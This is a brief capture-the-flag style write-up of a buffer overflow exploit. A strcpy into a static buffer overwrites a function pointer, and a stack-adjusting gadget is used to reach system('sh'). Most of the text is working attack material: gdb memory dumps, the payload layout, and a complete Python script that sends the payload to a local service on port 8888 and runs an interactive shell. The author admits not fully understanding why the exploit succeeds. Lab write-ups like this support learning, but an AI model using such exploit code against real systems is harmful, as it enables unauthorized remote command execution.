# Vulnerability
```c
char buf[48];
fgets(buf,48,stdin);
strcpy(buffer,buf);
```
This program uses strcpy function.

# Exploitation
```c
static char buffer[40];
static void (*ftn)();
```
This program declares buffer and function pointer as static.
```
(gdb) x/32x 0x08049800
0x8049800 <buffer>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049810 <buffer+16>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049820 <buffer+32>:	0x00000000	0x00000000	0x0804854a	0x0000000a
```
So, When I overwrite buffer, I can overwrite `ftn`.

When this program ends, It calls `ftn` function but the buffer's size(48) is not enought to give parameter.

The method that I used in this problem is calling `add` assembly code to move esp.
```
0x08048545 <main+80>:	call   0x80483a8
0x0804854a <main+85>:	add    $0x10,%esp
0x0804854d <main+88>:	mov    0x80497e4,%eax
```
By giving `0x0804854a` address, I can move esp and finally I can call system function.

The payload will be:
```
------------------------------------------------------------------------------
| ("A"*40 + add_gadget + '\n') * 4 | dummy(8) | system(4) | "AAAA" | sh_addr |
------------------------------------------------------------------------------
I don't know exactly how this problem solved, So I will check later again.

# Payload
```python
from struct import *
from socket import *
p = lambda x: pack('<L', x)

system 		= 0x007db0e7
add_gadget 	= 0x0804854a
sh_addr 	= 0x008bd987

payload = ""
payload += ("A"*40 + p(add_gadget) + '\n') * 4
payload += "A"*8 + p(system) + "A" * 4 + p(sh_addr)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 8888))
print s.recv(1024)
s.send(payload)
s.send("id\n")
while True:
	s.send(raw_input('$ ') + '\n')
	print s.recv(1024)
s.close()
```
